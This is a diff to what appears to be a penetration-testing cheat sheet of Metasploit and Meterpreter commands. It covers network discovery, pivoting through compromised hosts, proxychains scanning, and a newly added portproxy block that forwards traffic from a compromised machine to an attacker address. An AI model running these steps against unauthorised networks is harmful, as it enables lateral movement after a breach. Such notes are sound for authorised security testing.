@@ -13,25 +13,33 @@ arp
 netstat -antp
 
 #Meterpreter - Check network
-run arp_scanner -r [IP range]
+run arp_scanner -r [IP Range]
 run netenum
 
 -------
 |Pivot|
 -------
 #Add static route - metasploit
-route add [ip] [subnet] [session]
+route add [IP] [Subnet] [Session]
 
 #Add static route - meterpreter
-run autoroute -s [ip block]
+run autoroute -s [IP Range]
 
 #Set up proxychains
 use auxiliary/server/socks4a
 ##Add corresponding "socks4 127.0.0.1 1080" at bottom of /etc/proxychain.conf
 
 #Scan using proxychains
-proxychains nmap -sT -Pn -n [ip block]
+proxychains nmap -sT -Pn -n [IP Range]
 
 #Set up portforwarding
 portfwd add -l [local port] -p [remote port] -r [remote IP]
 
+#Set up port proxy
+##Sets up forward of traffic from Compromised IP/Port to Attacker IP/Port
+use post/windows/manage/portproxy
+set CONNECT_ADDRESS [Attacker IP]
+set CONNECT_PORT [Attacker Port]
+set LOCAL_ADDRESS [Compromised IP (internal nic)]
+set LOCAL_PORT [Compromised Port]
+set SESSION [Session]
